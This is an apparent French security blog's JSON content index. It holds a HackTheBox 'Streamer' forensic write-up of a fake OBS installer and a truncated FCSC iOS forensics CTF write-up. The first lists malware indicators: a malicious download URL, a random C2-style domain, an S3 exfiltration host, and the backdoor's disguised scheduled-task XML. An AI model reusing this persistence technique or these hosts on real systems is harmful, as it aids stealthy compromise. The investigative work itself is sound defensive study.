




[{"content":"","date":"8 juillet 2025","externalUrl":null,"permalink":"/blog-cyber/en/tags/graphite/","section":"Tags","summary":"","title":"Graphite","type":"tags"},{"content":"","date":"8 juillet 2025","externalUrl":null,"permalink":"/blog-cyber/en/tags/paragon/","section":"Tags","summary":"","title":"Paragon","type":"tags"},{"content":"","date":"8 juillet 2025","externalUrl":null,"permalink":"/blog-cyber/en/tags/patch-diffing/","section":"Tags","summary":"","title":"Patch-Diffing","type":"tags"},{"content":"","date":"1 juin 2025","externalUrl":null,"permalink":"/blog-cyber/tags/hackthebox/","section":"Tags","summary":"","title":"HackTheBox","type":"tags"},{"content":"","date":"1 juin 2025","externalUrl":null,"permalink":"/blog-cyber/tags/hard/","section":"Tags","summary":"","title":"Hard","type":"tags"},{"content":"","date":"1 juin 2025","externalUrl":null,"permalink":"/blog-cyber/","section":"Jaybird1291","summary":"","title":"Jaybird1291","type":"page"},{"content":"","date":"1 juin 2025","externalUrl":null,"permalink":"/blog-cyber/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"1 juin 2025","externalUrl":null,"permalink":"/blog-cyber/tags/sherlock/","section":"Tags","summary":"","title":"Sherlock","type":"tags"},{"content":"\rScénario #\rSimon Stark est un développeur chez forela qui a récemment prévu de diffuser des sessions de programmation avec ses collègues, ce qui lui a valu l\u0026rsquo;appréciation du PDG et d\u0026rsquo;autres collègues. Il a installé sans le savoir un logiciel de streaming bien connu qu\u0026rsquo;il a trouvé par le biais d\u0026rsquo;une recherche sur Google et qui était l\u0026rsquo;une des principales URL promues par les publicités de Google. Malheureusement, les choses ont mal tourné et un incident de sécurité s\u0026rsquo;est produit. Analysez les artefacts triés fournis pour découvrir ce qui s\u0026rsquo;est passé exactement.\nAttack Flow Diagram - Schéma global #\rPour un rapide overview du challenge voici l\u0026rsquo;attack flow diagram que j\u0026rsquo;ai réalisé, si vous ne voulez pas vous spoil vous pouvez le sauter :\nSetup #\rPour ce Sherlock nous allons utiliser :\nEric Zimmerman\u0026rsquo;s Tools (Registry Explorer, EvtxECmd, MFTECmd TimeLine Explorer, PECmd\u0026hellip;) HxD Hex Editor strings Pour nous aider on va aussi s\u0026rsquo;appuyer sur des Cheatsheets tels que :\nhttps://cdn.13cubed.com/downloads/windows_event_log_cheat_sheet.pdf https://cdn.13cubed.com/downloads/windows_registry_cheat_sheet.pdf https://cdn.13cubed.com/downloads/anatomy_of_an_ntfs_file_record.pdf Question 1 #\rQuel est le nom original du fichier zip malveillant que l\u0026rsquo;utilisateur a téléchargé en pensant qu\u0026rsquo;il s\u0026rsquo;agissait d\u0026rsquo;une copie légitime du logiciel ?\nPour répondre à cette question nous allons chercher dans la hive utilisateur NTUSER.DAT. En effet, c\u0026rsquo;est ici que sont enregistrées, dans la clé RecentDocs, les fichiers récemment ouverts par l’utilisateur.\nRéponse : OBS-Studio-28.1.2-Full-Installer-x64.zip\nQuestion 2 #\rSimon Stark a renommé le fichier zip téléchargé en un autre nom. Quel est le nom renommé du fichier ainsi que le chemin d\u0026rsquo;accès complet ?\nPour répondre à cette question, il faut d’abord comprendre que toute opération de renommage sous NTFS (le filesystem de Windows) génère une modification du $FILE_NAME (attribut 0x30) dans la MFT.\nOn utilise donc MFTECmd pour parser la $MFT :\nMFTECmd.exe -f \u0026#34;C:\\$MFT\u0026#34; --csv \u0026#34;C:\\Temp\\Out\u0026#34; Puis on l\u0026rsquo;importe dans Timeline Explorer :\nRéponse : C:\\Users\\Simon.stark\\Documents\\Streaming Software\\Obs Streaming Software.zip\nQuestion 3 #\rQuelle est l\u0026rsquo;heure à laquelle le fichier a été renommé ?\nToujours au même endroit :\nRéponse : 2023-05-05 10:22:23\nQuestion 4 #\rQuelle est l\u0026rsquo;URL complète à partir de laquelle le logiciel a été téléchargé ?\nToujours au même endroit :\nLe fait de télécharger un fichier sous Windows (via un navigateur comme Edge ou Internet Explorer) crée automatiquement, sur le NTFS, un flux de données auxiliaire nommé Zone.Identifier.\nCe flux ADS (“Alternate Data Stream”) est stocké avec le fichier lui-même et contient notamment :\nZoneId : la zone de sécurité (3 = internet) ReferrerUrl : l’URL de la page qui a lancé le téléchargement HostUrl : l’URL exacte du fichier téléchargé Réponse : http://obsproicet.net/download/v28_23/OBS-Studio-28.1.2-Full-Installer-x64.zip\nQuestion 5 #\rApprofondissez vos recherches et trouvez l\u0026rsquo;adresse IP sur laquelle le domaine malveillant était hébergé.\nIci très simple, on parse avec EvtxECmd les event logs et on cherche le nom de domaine :\nEvtxECmd.exe -d \u0026#39;C:\\Windows\\System32\\winevt\\Logs\\\u0026#39; --csv \u0026#39;C:\\Temp\\out\u0026#39; Réponse : 13.232.96.186\nQuestion 6 #\rPlusieurs ports sources sont connectés pour communiquer et télécharger le fichier malveillant à partir du site web malveillant. Répondez au numéro de port source le plus élevé à partir duquel la machine s\u0026rsquo;est connectée au site web malveillant.\nSur Windows si le pare-feu est configuré pour loggé les connexions, il va enregistrer chaque tentative d’accès, non pas sous forme de nom de domaine, mais sous la forme de l’IP cible.\nLe fichier pfirewall.log (C:\\Windows\\System32\\LogFiles\\Firewall) enregistre, pour chaque paquet examiné :\nla date et l’heure, l’action (par exemple “ALLOW” ou “DROP”), le protocole (TCP/UDP), l’adresse IP source, l’adresse IP de destination, les ports source et destination etc. Ici seulement 6 connexions à cette IP donc pas la peine de s\u0026rsquo;embêter, on peut le trouver manuellement en 5 secondes :\nRéponse : 50045\nQuestion 7 #\rLe fichier zip contenait un fichier d\u0026rsquo;installation malveillant qui installait un logiciel malveillant et une instance légitime du logiciel OBS studio, de sorte que l\u0026rsquo;utilisateur n\u0026rsquo;avait aucune idée qu\u0026rsquo;il avait été compromis. Trouvez le hachage du fichier d\u0026rsquo;installation.\nPour répondre à cette question on va chercher du côté de la hive Amcache. Elle recense tous les exécutables lorsqu’ils sont lancés, installés, copiés, etc. Elle stocke pour chaque application plusieurs metadata : chemin complet, date d’apparition, et notamment le hash SHA1 du binaire.\nConcrètement, au moment où l’utilisateur a extrait le zip et que le setup malveillant a été exécuté (ou même simplement ouvert en soit), Windows a ajouté une entrée dans la clé :\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppModel\\InventoryApplicationFile (correspondant à Amcache\\InventoryApplicationFile dans le hive Amcache.hve)\nSi nous avions eu une copie du disque complète, on aurait pu calculer le hash à la volée pour aller plus rapidement. Néanmoins, c\u0026rsquo;est une mauvaise idée.\nContrairement au simple hash calculé à la volée, Amcache enregistre le SHA1 dès la première exécution ou extraction dans le système local, indépendamment de toute modification ultérieure (à moins que l’entrée Amcache soit explicitement édité / supprimé).\nMême si l’utilisateur a effacé le zip ou renommé le setup, Amcache conserve cette ancienne trace tant que le fichier n’est pas réinstallé ou que l’entrée n’est pas nettoyée.\nRéponse : 35e3582a9ed14f8a4bb81fd6aca3f0009c78a3a1\nQuestion 8 #\rLe logiciel malveillant a installé automatiquement une porte dérobée sur le poste de travail de la victime. Quels sont le nom et le chemin d\u0026rsquo;accès au fichier de la porte dérobée ?\nRetournons à la $MFT car elle enregistre chaque création et exécution de fichier.\nPour procéder j\u0026rsquo;ai simplement chercher un lien temporel avec l\u0026rsquo;exécution du setup malveillant :\nje savais qu’à l’instant T0 (2023-05-05 10:23:14), l’utilisateur a lancé le setup malveillant quelques secondes plus tard (T0 + quelques secondes) apparaît dans la chronologie une nouvelle entrée : C:\\Program Files\\Miloyeki ker konoyogi\\lat takewode libigax weloj jihi quimodo datex dob cijoyi mawiropo.exe comme il n’existait pas avant (aucune entrée antérieure dans le $MFT pour ce chemin), on en déduit que c’est ce fichier qu’a créé le setup malveillant. Réponse : C:\\Users\\Simon.stark\\Miloyeki ker konoyogi\\lat takewode libigax weloj jihi quimodo datex dob cijoyi mawiropo.exe\nQuestion 9 #\rTrouver le \u0026ldquo;prefetch hash\u0026rdquo; de la backdoor.\nLorsque qu\u0026rsquo;on exécute un programme sous Windows, le système enregistre un fichier .pf (prefetch) dans C:\\Windows\\Prefetch dont le nom combine :\nLe nom de l’exécutable (LAT TAKEWODE….exe) Un hash calculé à partir de son chemin complet sur le disque Ce hash n’est pas aléatoire, Windows le génère pour distinguer plusieurs instances du même exécutable si elles résident à des chemins différents.\n.\\PECmd.exe -d \u0026#39;C:\\Windows\\prefetch\u0026#39; --csv \u0026#39;C:\\Temp\\Out\u0026#39; Réponse : D8A6D943\nQuestion 10 #\rLa backdoor est également utilisée comme mécanisme de persistance de manière furtive pour se fondre dans l\u0026rsquo;environnement. Quel est le nom utilisé pour le mécanisme de persistance afin qu\u0026rsquo;il ait l\u0026rsquo;air légal ?\nLes mécanismes de persistance les plus couramment mis en oeuvre sont :\nClés de registre Run / RunOnce Service Windows Tâches planifiées Dossier de démarrage (dossier Startup) etc. Ici, il repose sur la création d’une tâche planifiée dont le nom imite un processus système COMSurrogate. Quand Windows crée ou modifie une tâche planifiée, un événement ID 4698 (“A scheduled task was created”) est enregistré dans le journal de sécurité (Security.evtx).\n.\\EvtxECmd.exe -d \u0026#39;C:\\Windows\\System32\\winevt\\Logs\\\u0026#39; --csv \u0026#39;C:\\Temp\\Out\\\u0026#39; \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-16\u0026#34;?\u0026gt; \u0026lt;Task version=\u0026#34;1.2\u0026#34; xmlns=\u0026#34;http://schemas.microsoft.com/windows/2004/02/mit/task\u0026#34;\u0026gt; \u0026lt;RegistrationInfo\u0026gt; \u0026lt;Date\u0026gt;2023-05-05T15:23:21\u0026lt;/Date\u0026gt; \u0026lt;Author\u0026gt;FORELA\\simon.stark\u0026lt;/Author\u0026gt; \u0026lt;URI\u0026gt;\\COMSurrogate\u0026lt;/URI\u0026gt; \u0026lt;/RegistrationInfo\u0026gt; \u0026lt;Triggers\u0026gt; \u0026lt;LogonTrigger\u0026gt; \u0026lt;StartBoundary\u0026gt;2023-05-05T15:23:00\u0026lt;/StartBoundary\u0026gt; \u0026lt;Enabled\u0026gt;true\u0026lt;/Enabled\u0026gt; \u0026lt;/LogonTrigger\u0026gt; \u0026lt;/Triggers\u0026gt; \u0026lt;Principals\u0026gt; \u0026lt;Principal id=\u0026#34;Author\u0026#34;\u0026gt; \u0026lt;RunLevel\u0026gt;HighestAvailable\u0026lt;/RunLevel\u0026gt; \u0026lt;UserId\u0026gt;FORELA\\simon.stark\u0026lt;/UserId\u0026gt; \u0026lt;LogonType\u0026gt;InteractiveToken\u0026lt;/LogonType\u0026gt; \u0026lt;/Principal\u0026gt; \u0026lt;/Principals\u0026gt; \u0026lt;Settings\u0026gt; \u0026lt;MultipleInstancesPolicy\u0026gt;IgnoreNew\u0026lt;/MultipleInstancesPolicy\u0026gt; \u0026lt;DisallowStartIfOnBatteries\u0026gt;true\u0026lt;/DisallowStartIfOnBatteries\u0026gt; \u0026lt;StopIfGoingOnBatteries\u0026gt;true\u0026lt;/StopIfGoingOnBatteries\u0026gt; \u0026lt;AllowHardTerminate\u0026gt;true\u0026lt;/AllowHardTerminate\u0026gt; \u0026lt;StartWhenAvailable\u0026gt;false\u0026lt;/StartWhenAvailable\u0026gt; \u0026lt;RunOnlyIfNetworkAvailable\u0026gt;false\u0026lt;/RunOnlyIfNetworkAvailable\u0026gt; \u0026lt;IdleSettings\u0026gt; \u0026lt;Duration\u0026gt;PT10M\u0026lt;/Duration\u0026gt; \u0026lt;WaitTimeout\u0026gt;PT1H\u0026lt;/WaitTimeout\u0026gt; \u0026lt;StopOnIdleEnd\u0026gt;true\u0026lt;/StopOnIdleEnd\u0026gt; \u0026lt;RestartOnIdle\u0026gt;false\u0026lt;/RestartOnIdle\u0026gt; \u0026lt;/IdleSettings\u0026gt; \u0026lt;AllowStartOnDemand\u0026gt;true\u0026lt;/AllowStartOnDemand\u0026gt; \u0026lt;Enabled\u0026gt;true\u0026lt;/Enabled\u0026gt; \u0026lt;Hidden\u0026gt;false\u0026lt;/Hidden\u0026gt; \u0026lt;RunOnlyIfIdle\u0026gt;false\u0026lt;/RunOnlyIfIdle\u0026gt; \u0026lt;WakeToRun\u0026gt;false\u0026lt;/WakeToRun\u0026gt; \u0026lt;ExecutionTimeLimit\u0026gt;PT72H\u0026lt;/ExecutionTimeLimit\u0026gt; \u0026lt;Priority\u0026gt;7\u0026lt;/Priority\u0026gt; \u0026lt;/Settings\u0026gt; \u0026lt;Actions Context=\u0026#34;Author\u0026#34;\u0026gt; \u0026lt;Exec\u0026gt; \u0026lt;Command\u0026gt;C:\\Users\\Simon.stark\\Miloyeki\u0026lt;/Command\u0026gt; \u0026lt;Arguments\u0026gt;ker konoyogi\\lat takewode libigax weloj jihi quimodo datex dob cijoyi mawiropo.exe\u0026lt;/Arguments\u0026gt; \u0026lt;/Exec\u0026gt; \u0026lt;/Actions\u0026gt; \u0026lt;/Task\u0026gt; Réponse : COMSurrogate\nQuestion 11 #\rQuel est le domaine erroné/invalide nommé de manière aléatoire que le logiciel malveillant a tenté d\u0026rsquo;atteindre ?\nPuisque la tâche planifiée a été créée à 10:23:21, on se place autour de cet horaire dans le channel Microsoft-Windows-DNS-Client/Operational pour repérer le domaine \u0026ldquo;invalide\u0026rdquo; que le malware a tenté de résoudre.\nRéponse : oaueeewy3pdy31g3kpqorpc4e.qopgwwytep\nQuestion 12 #\rLe logiciel malveillant a essayé d\u0026rsquo;exfiltrer les données vers un seau s3. Quelle est l\u0026rsquo;url du seau s3 ?\nIdem mais on filtre avec \u0026ldquo;s3\u0026rdquo; :\nRéponse : bbuseruploads.s3.amazonaws.com\nQuestion 13 #\rSur quel sujet Simon allait-il faire un stream en semaine 1 ? Trouvez une note ou quelque chose de similaire et récupérez son contenu pour répondre à la question.\nOn retrouve dans les fichiers récents de l\u0026rsquo;utilisateur un shortcut vers le fichier \u0026ldquo;Week 1 plan.txt\u0026rdquo;. Mais aucune trace du fichier car on n\u0026rsquo;a pas la copie du dossier en question.\nOn va donc analyser la $MFT. Comme on l\u0026rsquo;a déjà vu, chaque fichier même s\u0026rsquo;il a été effacé ou déplacé possède une entrée dans la MFT et on va pouvoir retrouver la \u0026ldquo;resident data\u0026rdquo; :\nNon-resident : pour les fichiers de taille suffisante, NTFS ne stocke pas directement leurs données dans la MFT. Le champ $DATA contient alors des “runs” (des blocs) qui pointent vers des clusters sur le disque où le contenu réel est stocké. Resident : quand que le fichier est très petit (historiquement : moins de 1 KB ou de l’ordre de quelques centaines d’octets, selon la version de Windows et la taille de l’attribut), ses données sont stockées directement à l’intérieur même de l’entrée MFT, dans le bloc $DATA. On parle alors de resident data. ┌───────────────┬─────────────────────────────────┬─────────────────────┐ │ MFT Header │ Attribut #0 (STANDARD_INFO) │ ... │ │ (48 bytes…) ├─────────────────────────────────┤ │ │ │ Attribut #1 (FILE_NAME)│ │ │ │ ├─────────────────────────────────┤ │ │ │ Attribut #2 (DATA, resident) │ \u0026lt;— c’est là qu’est │ │ │ │ stocké le texte. │ │ └─────────────────────────────────┴─────────────────────┘ │\t...... │ └───────────────────────────────────────────────────────────────────────┘ cf. https://youtu.be/B4b6Ocf3wYs?si=rUruujZiEIdjgFKD\nRéponse : Filesystem Security\nQuestion 14 #\rQuel est le nom de l\u0026rsquo;analyste de sécurité qui a trié le poste de travail infecté ?\nUn peu de guess car la question n\u0026rsquo;est pas très intéressante, si vous avez fait pas mal de Sherlock vous commencez à avoir l\u0026rsquo;habitude c\u0026rsquo;est CyberJunkie.\nRéponse : CyberJunkie\nQuestion 15 #\rQuel est le chemin d\u0026rsquo;accès au réseau à partir duquel les outils d\u0026rsquo;acquisition ont été exécutés ?\nPremièrement nous devons trouver le tool utilisé. Pour cela, plusieurs méthodes :\nvérifier les fichiers LNK \u0026amp; Jump Lists Event ID 4688 (A new process has been created) AmCache (InventoryApplicationFile) $MFT comme on l\u0026rsquo;a vu plus tôt Les fichiers Prefetch Pour le plus de rapidité j\u0026rsquo;ai décidé de passer via les fichiers prefetch. Logiquement le tool d\u0026rsquo;acquisition a été lancé le plus récemment possible :\nNéanmoins pas de chemin.\nDu coup, je vérifie dans :\nAppCompatCache : RAS Event ID 4688 : RAS $MFT : RAS Je vais donc chercher du côté du NTUSER.DAT mais RAS aussi\u0026hellip; Néanmoins on voit bien qu\u0026rsquo;on a ntuser.dat.LOG1 et LOG2.\nCe sont des journaux de transactions associé à la ruche de registre utilisateur (NTUSER.DAT).\nChaque modification apportée aux clés et valeurs du registre (par exemple, lorsqu’un chemin réseau est ajouté dans un MRU ou un clé UserAssist) est d’abord écrite dans ce journal avant d’être intégrée (“committée\u0026quot;) dans NTUSER.DAT lui-même. Concrètement :\nc’est le log transactionnel de la ruche utilisateur : à chaque fois qu’une application ou Windows écrit quelque chose dans HKCU (RunMRU, UserAssist, RecentDocs, etc.), la modification est d’abord consignées dans NTUSER.DAT.LOG1 (et LOG2), puis fusionnée dans NTUSER.DAT à un checkpoint si on ferme brutalement la session ou qu’aucun “checkpoint” n’a encore eu lieu, NTUSER.DAT.LOG1 peut contenir des entrées qui n’apparaissent pas encore dans NTUSER.DAT Je lance donc une recherche via string et bingo :\nRéponse : \\\\DESKTOP-887GK2L\\Users\\CyberJunkie\\Desktop\\Forela-Triage-Workstation\\Acquisiton and Triage tools\nIOC Table #\rCatégorie Type / Champ Valeur (indicateur) Notes Hash Fichiers (origine) Nom ZIP original OBS-Studio-28.1.2-Full-Installer-x64.zip NTUSER.DAT ▸ RecentDocs RAS (pas le fichier) Setup malveillant OBS Studio 28.1.2 Full Installer x64.exe Amcache ▸ InventoryApplicationFile SHA-1 = 35e3582a9ed14f8a4bb81fd6aca3f0009c78a3a1 Backdoor EXE C:\\Users\\Simon.stark\\Miloyeki ker konoyogi\\lat takewode libigax weloj jihi quimodo datex dob cijoyi mawiropo.exe $MFT RAS (pas le fichier) Réseau Domain obsproicet.net ADS Zone.Identifier URL exacte http://obsproicet.net/download/v28_23/OBS-Studio-28.1.2-Full-Installer-x64.zip ADS Zone.Identifier IP serveur 13.232.96.186 pfirewall.log Port source max 50045 (TCP) pfirewall.log Domain invalide oaueeewy3pdy31g3kpqorpc4e.qopgwwytep DNS-Client Operational Bucket S3 exfil bbuseruploads.s3.amazonaws.com DNS-Client Operational Persistance Scheduled Task Name \\COMSurrogate Security.evtx (4698) Prefetch hash D8A6D943 Nom du .pf Lab terminé !\nhttps://labs.hackthebox.com/achievement/sherlock/1271052/899\n","date":"1 juin 2025","externalUrl":null,"permalink":"/blog-cyber/posts/streamer/","section":"Posts","summary":"Scénario #\rSimon Stark est un développeur chez forela qui a récemment prévu de diffuser des sessions de programmation avec ses collègues, ce qui lui a valu l\u0026rsquo;appréciation du PDG et d\u0026rsquo;autres collègues.","title":"Streamer","type":"posts"},{"content":"","date":"1 juin 2025","externalUrl":null,"permalink":"/blog-cyber/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"1 juin 2025","externalUrl":null,"permalink":"/blog-cyber/tags/windows/","section":"Tags","summary":"","title":"Windows","type":"tags"},{"content":"","date":"1 juin 2025","externalUrl":null,"permalink":"/blog-cyber/tags/writeup/","section":"Tags","summary":"","title":"Writeup","type":"tags"},{"content":"","date":"18 mai 2025","externalUrl":null,"permalink":"/blog-cyber/tags/2025/","section":"Tags","summary":"","title":"2025","type":"tags"},{"content":"","date":"18 mai 2025","externalUrl":null,"permalink":"/blog-cyber/tags/fcsc/","section":"Tags","summary":"","title":"FCSC","type":"tags"},{"content":"\rScénario #\rLors d\u0026rsquo;un passage de douane, le douanier vous demande de lui remettre votre téléphone ainsi que son code de déverrouillage. Le téléphone vous est rendu quelques heures plus tard … Suspicieux, vous envoyez votre téléphone pour analyse au CERT-FR de l\u0026rsquo;ANSSI. Les analystes du CERT-FR effectuent une collecte sur le téléphone, composée d\u0026rsquo;un sysdiagnose et d\u0026rsquo;un backup. Ces épreuves font partie d\u0026rsquo;une série. Les épreuves sont indépendantes sauf iBackdoor 2/2 qui dépend de iBackdoor 1/2 : iForensics - iCrash iForensics - iDevice iForensics - iWiFi iForensics - iTreasure iForensics - iNvisible iForensics - iBackdoor 1/2 iForensics - iBackdoor 2/2 iForensics - iC2 iForensics - iCompromise\nOn a donc une backup.tar.xz (logique) et des sysdiagnose \u0026amp; crashes !\nSetup #\rPour ces challenges nous allons utiliser :\nDB Browser for SQLite EC-DIGIT-CSIRC/sysdiagnose iLEAPP Autopsy On peut aussi s\u0026rsquo;aider de cheatsheets telles que :\nOn pourrait aussi utiliser des tools et méthodologies plus \u0026ldquo;pro\u0026rdquo; (via Plaso etc.) mais dans le contexte du CTF (fait en retard) je n\u0026rsquo;ai pas pris le temps de le faire. 🤠\nIntro - iForensics - iCrash #\rIl semblerait qu\u0026rsquo;un flag se soit caché à l\u0026rsquo;endroit où sont stockés les crashes sur le téléphone …\nIci très simple. On sait que les crashs se trouvent dans l\u0026rsquo;archive sysdiagnose_and_crashes.tar.xz. On l\u0026rsquo;extrait donc :\ntar -xf sysdiagnose_and_crashes.tar.xz Ici on peut trouver de plusieurs manières, un simple grep grep -r \u0026quot;FCSC{\u0026quot;, se balader dans les logs de crash etc.\nSi on se rend dans sysdiagnose_and_crashes/private/var/mobile/Library/Logs/CrashReporter/ on trouve le fichier fcsc_intro.txt avec le flag.\nFlag : FCSC{7a1ca2d4f17d4e1aa8936f2e906f0be8}\n⭐ - iForensics - iDevice #\rPour commencer, trouvez quelques informations d\u0026rsquo;intérêt sur le téléphone : version d\u0026rsquo;iOS et identifiant du modèle de téléphone. Le flag est au format FCSC{\u0026lt;identifiant du modèle\u0026gt;|\u0026lt;numéro de build\u0026gt;}. Par exemple, pour un iPhone 14 Pro Max en iOS 18.4 (22E240) : FCSC{iPhone15,3|22E240}.\nPour répondre à cette question il faut savoir de quoi est constitué une backup iOS. J\u0026rsquo;ai parlé plus haut de backup \u0026ldquo;logique\u0026rdquo;. Cela a une importance car si on regarde à l\u0026rsquo;intérieur de la backup on ne voit que des dossiers bizarres :\nEn fait il faut reconstruire la structure et noms de dossiers / fichiers. Pour cela il faut utiliser la Manifest.db (iOS 10+) en faisant la correspondance entre les RelativePath et les FileID.\nNéanmoins on voit aussi des fichiers avec des noms normaux dont Info.plist. C\u0026rsquo;est ici qu\u0026rsquo;Apple conserve les metadata clés concernant l\u0026rsquo;appareil :\nProduct Type (identifiant du modèle, ex. iPhone12,3), Product Version (version d\u0026rsquo;iOS, ex. 16.0), Build Version (numéro de build, ex. 20A362), Divers identifiants (IMEI, MEID, Serial Number, GUID…), Date du dernier backup, applications installées, etc. On a donc tout ce qu\u0026rsquo;il nous faut pour faire le flag :\nFlag : FCSC{iPhone12,3|20A362}\nSi reconstruire l\u0026rsquo;arbo vous intéresse voici pour la démonstration :\nPremièrement regardons de quoi est constitué Manifest.db :\nTrès direct, on peut donc scripter facilement la reconstruction comme cela :\n#!/bin/bash BACKUP=\u0026#34;/mnt/hgfs/backup/backup\u0026#34; OUT=\u0026#34;/mnt/hgfs/backup/reconstructed-backup\u0026#34; mkdir -p \u0026#34;$OUT\u0026#34; # on utilise -separator \u0026#39;|\u0026#39; pour que SQLite nous renvoie directement fileID|domain|relativePath sqlite3 -separator \u0026#39;|\u0026#39; \u0026#34;$BACKUP/Manifest.db\u0026#34; \\ \u0026#34;SELECT fileID, domain, COALESCE(relativePath,\u0026#39;\u0026#39;) FROM Files;\u0026#34; \\ | while IFS=\u0026#34;|\u0026#34; read -r FILEID DOMAIN RELPATH; do # Si relativePath est vide, on saute (ce sont souvent des entrées de dossier sans chemin) [[ -z \u0026#34;$RELPATH\u0026#34; ]] \u0026amp;\u0026amp; continue # Chemins de sortie pour recréer l\u0026#39;arborescence DEST_DIR=\u0026#34;$OUT/$DOMAIN/$(dirname \u0026#34;$RELPATH\u0026#34;)\u0026#34; DEST_PATH=\u0026#34;$OUT/$DOMAIN/$RELPATH\u0026#34; mkdir -p \u0026#34;$DEST_DIR\u0026#34; ln -s \u0026#34;$BACKUP/$FILEID\u0026#34; \u0026#34;$DEST_PATH\u0026#34; 2\u0026gt;/dev/null || true done Et voilà :\n⭐ - iForensics - iWiFi #\rPour continuer, trouvez quelques informations d\u0026rsquo;intérêt sur le téléphone : SSID et BSSID du réseau WiFi sur lequel le téléphone est connecté ainsi que le compte iCloud associé au téléphone. Le flag est au format FCSC{||}. Par exemple, si le téléphone est connecté sur le réseau WiFi example, qui a pour BSSID 00:11:22:33:44:55 et que le compte iCloud associé est example@example.com : FCSC{example|00:11:22:33:44:55|example@example.com}.\nAfin d\u0026rsquo;accélérer l\u0026rsquo;extraction des informations Wi-Fi et iCloud, on peut utiliser iLEAPP (iOS Logs, Events, and Protobuf Parser) : il va collecter et organiser automatiquement pour nous pleins d\u0026rsquo;artefacts et faire un rapport.\nBref après avoir fait passé l\u0026rsquo;ILEAPP on trouve le SSID \u0026amp; BSSID ici :\nPour le compte iCloud plusieurs manières mais une façon assez direct avec iLEAPP et de regarder par quel compte les apps ont-elles été installé :\nFlag : FCSC{FCSC|66:20:95:6c:9b:37|robertswigert@icloud.com}\n⭐⭐ - iForensics - iTreasure #\rAvant la remise du téléphone à la douane, le propriétaire du téléphone a eu le temps d\u0026rsquo;envoyer un trésor. Retrouvez ce trésor.\nIci plusieurs manières rapide de le trouver. En effet le scénario parle d\u0026rsquo;un envoi. On pense directement au SMS.\niLEAPP parse cela donc on peut aller checker directement :\nOn peut aussi le faire ingérer à Autopsy avec le module \u0026ldquo;Logical File Analysis\u0026rdquo;. Grâce à cela, Autopsy va scanner tous les fichiers et, d\u0026rsquo;après leurs en-têtes (magic bytes), il va regrouper certains des médias (JPEG, PNG, etc.) sous l\u0026rsquo;onglet \u0026ldquo;User Content Suspected\u0026rdquo; car le Chemin d\u0026rsquo;accès est localisé dans HomeDomain/Media/DCIM/…. Il considère donc qu\u0026rsquo;il s\u0026rsquo;agit d\u0026rsquo;un contenu utilisateur (photo prise ou importée)\nFlag : FCSC{511773550dca}\n⭐⭐ - iForensics - iNvisible #\rIl semblerait qu\u0026rsquo;un message n\u0026rsquo;ait pas pu s\u0026rsquo;envoyer … Retrouvez le destinataire de ce message. Le flag est au format FCSC{}. Par exemple, si le destinataire est example@example.com : FCSC{example@example.com}.\nIci très rapide, on peut directement aller chercher dans la DB sms.db. C\u0026rsquo;est cette base qui contient toutes les conversations (iMessage et SMS), avec les tables principales message (headers, état, texte, etc.) et handle (liste des correspondants, numéros / adresses).\nNe faites pas l\u0026rsquo;erreur d\u0026rsquo;aller chercher dans la table \u0026ldquo;message\u0026rdquo;. En effet, on ne retrouve que les iMessage ici. Pour les SMS il faut aller dans la table \u0026ldquo;chat\u0026rdquo;.\nFlag : FCSC{kristy.friedman@outlook.com}\n⭐⭐ - iForensics - iBackdoor 1/2 #\rVous continuez vos analyses afin de trouver la backdoor sur le téléphone. Vous finissez par vous rendre compte qu\u0026rsquo;une application est compromise et que le téléphone était infecté au moment de la collecte … Trouvez l\u0026rsquo;identifiant de l\u0026rsquo;application compromise ainsi que l\u0026rsquo;identifiant de processus (PID) du malware.\nLe flag est au format FCSC{|}. Par exemple, si l\u0026rsquo;application compromise est Example (com.example) et que le PID est 1337 : FCSC{com.example|1337}.\nIci on va devoir s\u0026rsquo;appuyer sur les sysdiagnose (/sysdiagnose_and_crashes/private/var/mobile/Library/Logs/CrashReporter/DiagnosticLogs/sysdiagnose/sysdiagnose_2025.04.07_08-06-18-0700_iPhone-OS_iPhone_20A362).\nMais avant c\u0026rsquo;est quoi les sysdiagnose ? C\u0026rsquo;est une archive générée par iOS qui regroupe automatiquement les logs système, rapports de crash, états réseau et informations de configuration au moment de la capture. Il sert principalement à diagnostiquer des problèmes de performance ou de stabilité en fournissant un instantané complet de l\u0026rsquo;appareil. Mais il est aussi très utile d\u0026rsquo;un point de vu forensic après une compromission.\nPour être un minimum pro et gagner du temps je vais utiliser le superbe tool EC-DIGIT-CSIRC/sysdiagnose https://github.com/EC-DIGIT-CSIRC/sysdiagnose.\n┌──(venv)─(kali㉿kali)-[~/sysdiagnose] └─$ sysdiag create /mnt/hgfs/backup/sysdiagnose_and_crashes/private/var/mobile/Library/Logs/CrashReporter/DiagnosticLogs/sysdiagnose/sysdiagnose_2025.04.07_08-06-18-0700_iPhone-OS_iPhone_20A362.tar.gz Sysdiagnose file has been processed: /mnt/hgfs/backup/sysdiagnose_and_crashes/private/var/mobile/Library/Logs/CrashReporter/DiagnosticLogs/sysdiagnose/sysdiagnose_2025.04.07_08-06-18-0700_iPhone-OS_iPhone_20A362.tar.gz Case \u0026#39;C39ZL6V1N6Y6_20250407_080618\u0026#39; created successfully from \u0026#39;/mnt/hgfs/backup/sysdiagnose_and_crashes/private/var/mobile/Library/Logs/CrashReporter/DiagnosticLogs/sysdiagnose/sysdiagnose_2025.04.07_08-06-18-0700_iPhone-OS_iPhone_20A362.tar.gz\u0026#39; On voit bien que la case a été créé :\nOn fait passer le parser \u0026ldquo;ps\u0026rdquo; car très utile dans ce contexte. En effet analyser le contenu de ps.txt (le listing des processus) permet :\nD\u0026rsquo;avoir une visibilité sur tous les processus en cours : Le ps.txt fournit un instantané de tout ce qui tourne sur l\u0026rsquo;iPhone (y compris les exécutables cachés ou lancés par des services système). Sans ce listing, un malware qui se dissimule derrière un nom trompeur ou dans un répertoire non standard pourrait passer inaperçu.\nDétection d\u0026rsquo;anomalies dans les privilèges En regardant les colonnes user/uid et ppid, on repère rapidement quand un processus tiers (par exemple extrait d\u0026rsquo;une app tierce) s\u0026rsquo;exécute sous l\u0026rsquo;utilisateur root (UID 0). Or, une app normale ne devrait jamais obtenir un tel niveau de privilèges sans passer par un mécanisme officiel.\nIdentification de commandes et arguments suspects Le champ command montre l\u0026rsquo;exécutable et ses arguments. Tout binaire inconnu (comme ce 